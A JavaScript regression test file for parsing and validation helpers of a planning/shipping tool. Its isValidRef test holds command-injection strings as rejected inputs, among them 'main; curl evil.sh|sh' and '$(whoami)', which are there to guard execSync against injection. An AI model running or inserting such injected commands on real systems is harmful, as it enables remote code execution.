// Regression tests for the pure decision/parse helpers in lib/_shared.js.
// Each test pins a bug that was found and fixed:

import { test, describe } from "node:test";
import assert from "node:assert/strict";

import {
  parseFrontmatter,
  stringifyFrontmatter,
  parseRoadmap,
  stringifyRoadmap,
  parseRequirements,
  stringifyRequirements,
  slugify,
  zeroPad,
  matchesGapClosure,
  isValidRef,
  isClosedPhase,
} from "../lib/_shared.js";

describe("frontmatter parse/stringify", () => {
  test("round-trips nested progress block, booleans, numbers, arrays", async () => {
    const fm = {
      gsd_state_version: 1,
      milestone: "v1.0",
      status: "idle",
      progress: { total_phases: 3, completed_phases: 1, total_plans: 2, completed_plans: 1, percent: 33 },
      flags: ["a", "b"],
      active: true,
      ratio: 0.5,
    };
    const text = stringifyFrontmatter(fm);
    const parsed = parseFrontmatter(`---\n${text.replace(/^---\n/, "").replace(/\n---$/, "")}\n---\nBODY`).frontmatter;
    assert.deepEqual(parsed.progress, { total_phases: 3, completed_phases: 1, total_plans: 2, completed_plans: 1, percent: 33 });
    assert.deepEqual(parsed.flags, ["a", "b"]);
    assert.equal(parsed.active, true);
    assert.equal(parsed.ratio, 0.5);
    assert.equal(parsed.milestone, "v1.0");
  });

  test("fenceless frontmatter (no --- fences) parses scalars, flow arrays, and block lists", async () => {
    // BUG (fenced requirement): the planner subagent wrote PLAN.md without ---
    // fences; parseFrontmatter returned {} so requirements/wave/type were lost
    // and gsd_plan flagged every REQ-ID as uncovered.
    const text = `phase: 01-auth
plan: 01
type: tdd
wave: 1
depends_on: []
files_modified:
  - src/auth.js
  - tests/test_auth.py
autonomous: true
requirements: ["AUTH-01", "TODO-01"]
gap_closure: true
must_haves:
  truths:
    - "truth one"
    - "truth two"
<objective>add login</objective>
<tasks>
<task type="auto"><name>t</name></task>
</tasks>`;
    const { frontmatter, body } = parseFrontmatter(text);
    assert.deepEqual(frontmatter.requirements, ["AUTH-01", "TODO-01"]);
    assert.equal(frontmatter.type, "tdd");
    assert.equal(frontmatter.wave, 1);
    assert.equal(frontmatter.gap_closure, true);
    assert.deepEqual(frontmatter.files_modified, ["src/auth.js", "tests/test_auth.py"]);
    assert.deepEqual(frontmatter.must_haves.truths, ["truth one", "truth two"]);
    assert.match(body.trim(), /^<objective>/);
    assert.match(body, /<tasks>/);
  });

  test("quoted values and colons survive stringify/parse", async () => {
    const text = stringifyFrontmatter({ note: "a: colon", desc: "has spaces" });
    const fm = parseFrontmatter(`${text}\nBODY`).frontmatter;
    assert.equal(fm.note, "a: colon");
    assert.equal(fm.desc, "has spaces");
  });
});

describe("roadmap", () => {
  test("round-trips phases including zero-requirement phases", async () => {
    // BUG: parseRoadmap required >=4 table cells, so a phase with no REQ-IDs
    // was silently dropped from the roadmap (breaking phaseDir/planIndex).
    const roadmap = {
      milestoneName: "M1",
      version: "v1.0",
      phases: [
        { n: 1, name: "auth", goal: "Add login", requirements: ["AUTH-01"], status: "pending" },
        { n: 2, name: "empty", goal: "No reqs", requirements: [], status: "pending" },
        { n: 3, name: "done", goal: "Done", requirements: ["TODO-01"], status: "Complete" },
      ],
    };
    const parsed = parseRoadmap(stringifyRoadmap(roadmap));
    assert.equal(parsed.phases.length, 3);
    assert.deepEqual(parsed.phases[1].requirements, []);
    assert.equal(parsed.phases[1].status, "pending");
    assert.equal(parsed.phases[2].status, "Complete");
    assert.deepEqual(parsed.phases[0].requirements, ["AUTH-01"]);
  });
});

describe("requirements", () => {
  test("parse/stringify preserves ids and completion state", async () => {
    const reqs = [
      { id: "AUTH-01", text: "User can log in", complete: false },
      { id: "TODO-01", text: "Add a task", complete: true },
    ];
    const parsed = parseRequirements(stringifyRequirements(reqs));
    assert.equal(parsed.length, 2);
    assert.equal(parsed[0].id, "AUTH-01");
    assert.equal(parsed[0].complete, false);
    assert.equal(parsed[1].complete, true);
  });
});

describe("misc", () => {
  test("slugify and zeroPad", async () => {
    assert.equal(slugify("My Cool Phase!"), "my-cool-phase");
    assert.equal(zeroPad(1), "01");
    assert.equal(zeroPad(12), "12");
  });
});

describe("matchesGapClosure (gsd_execute --gaps-only)", () => {
  test("accepts boolean true, 'true', 'True'; rejects false/undefined/null", async () => {
    // BUG: the filter compared `p.gap_closure === "true"` against a boolean,
    // so --gaps-only never matched any plan and silently ran nothing.
    assert.equal(matchesGapClosure(true), true);
    assert.equal(matchesGapClosure("true"), true);
    assert.equal(matchesGapClosure("True"), true);
    assert.equal(matchesGapClosure(false), false);
    assert.equal(matchesGapClosure("false"), false);
    assert.equal(matchesGapClosure(undefined), false);
    assert.equal(matchesGapClosure(null), false);
  });
});

describe("isValidRef (gsd_ship base-branch validation)", () => {
  test("accepts normal refs; rejects shell metacharacters", async () => {
    // BUG: base/branch values were interpolated into execSync strings (command
    // injection); validation is the guard.
    assert.equal(isValidRef("main"), true);
    assert.equal(isValidRef("feature/auth"), true);
    assert.equal(isValidRef("release/1.0.0"), true);
    assert.equal(isValidRef("main; curl evil.sh|sh"), false);
    assert.equal(isValidRef("$(whoami)"), false);
    assert.equal(isValidRef("`pwd`"), false);
    assert.equal(isValidRef("a b"), false);
    assert.equal(isValidRef(undefined), false);
    assert.equal(isValidRef(""), false); // REF_RE requires at least one character
  });
});

describe("isClosedPhase (gsd_plan --force gate)", () => {
  test("true only for status: passed; false for gaps_found, human_needed, garbage", async () => {
    // BUG: the gate regex /status:\s*passed/ also matched statuses like
    // "not passed" and missed fenceless VERIFICATION files.
    assert.equal(isClosedPhase(`---\nstatus: passed\n---\n`), true);
    assert.equal(isClosedPhase(`status: passed\n`), true);
    assert.equal(isClosedPhase(`---\nstatus: gaps_found\n---\n`), false);
    assert.equal(isClosedPhase(`---\nstatus: human_needed\n---\n`), false);
    assert.equal(isClosedPhase(`status: not passed\n`), false);
    assert.equal(isClosedPhase(""), false);
    assert.equal(isClosedPhase(undefined), false);
    assert.equal(isClosedPhase(`---\nstatus: "passed"\n---\n`), true);
  });
});
